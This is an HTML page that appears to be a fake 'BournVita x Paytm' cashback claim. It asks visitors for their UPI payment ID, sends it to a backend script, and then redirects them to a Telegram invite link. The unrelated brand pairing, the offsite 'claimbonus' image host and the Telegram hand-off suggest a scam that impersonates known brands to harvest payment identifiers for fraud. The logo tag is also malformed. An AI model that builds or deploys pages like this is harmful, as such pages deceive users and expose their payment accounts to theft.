<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Cashback Claim</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
  <style>
    body {
      margin: 0;
      font-family: "Poppins", sans-serif;
      background: #ff7a00; /* Orange background */
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 420px;
      text-align: center;
    }

    .logo {
      margin-bottom: 25px;
    }

    .logo img {
      width: 160px;
    }

    h2 {
      margin-bottom: 25px;
      font-size: 24px;
      font-weight: 600;
    }

    label {
      display: block;
      text-align: left;
      margin: 12px 29px 6px;
      font-size: 14px;
      font-weight: 500;
      color: #fff;
    }

    input[type="text"] {
      width: 80%;
      padding: 14px;
      border-radius: 10px;
      border: none;
      font-size: 15px;
      outline: none;
      color: #000;
      background: #fff;
      margin-bottom: 20px;
    }

    button {
      display: inline-block;   /* ✅ keeps button inline */
      padding: 14px 40px;      /* ✅ smaller button */
      background: #fff;
      color: #ff7a00;
      border: none;
      border-radius: 30px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 10px;
      transition: all 0.2s;
    }

    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
    }

    button:active {
      transform: scale(0.96);
    }

    .result {
      margin-top: 18px;
      padding: 12px;
      border-radius: 10px;
      font-size: 14px;
      display: none;
      word-wrap: break-word;
    }

    .success {
      background: rgba(22,163,74,0.85);
      color: #fff;
    }

    .error {
      background: rgba(220,38,38,0.85);
      color: #fff;
    }
    @media (max-width: 500px) {
  .input-container input {
    width: 60%; /* adjust as needed, e.g. 70% or 90% */
  }

  #claimbtn {
    width: 60%; /* optional: shrink button too */
  }
}

  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <!-- You can replace with your own logo -->
      <img https://bournvita.claimbonus.in/635c90d2aa1257d38e3429f09f1a1693.png" alt="Logo">
    </div>

    <h2>BournVita x Paytm</h2>

    <form onsubmit="event.preventDefault(); claim();">
      <label for="vpa">UPI ID</label>
      <input type="text" id="vpa" placeholder="Enter UPI ID">
      <br>
      <button type="submit">Claim</button>
    </form>

    <div id="result" class="result"></div>
  </div>

  <script>
    function claim() {
      const vpa = document.getElementById("vpa").value.trim();
      const resultBox = document.getElementById("result");

      if (!vpa) {
        resultBox.style.display = "block";
        resultBox.className = "result error";
        resultBox.innerText = "⚠️ Please enter UPI ID";
        return;
      }

      resultBox.style.display = "block";
      resultBox.className = "result";
      resultBox.innerText = "⏳ Processing...";

      fetch("process.php?vpa=" + encodeURIComponent(vpa))
        .then(res => res.json())
        .then(data => {
          resultBox.style.display = "block";
          if (data.status === "success") {
            resultBox.className = "result success";
            resultBox.innerText = "✅ " + data.message;
            document.getElementById("vpa").value = "";
            setTimeout(() => location.href = "https://telegram.dog/+ym6xDRtOEgVhZjNl", 3000);
          } else {
            resultBox.className = "result error";
            resultBox.innerText = "❌ " + data.message;
          }
        })
        .catch(() => {
          resultBox.style.display = "block";
          resultBox.className = "result error";
          resultBox.innerText = "❌ Request failed!";
        });
    }
  </script>
</body>
</html>
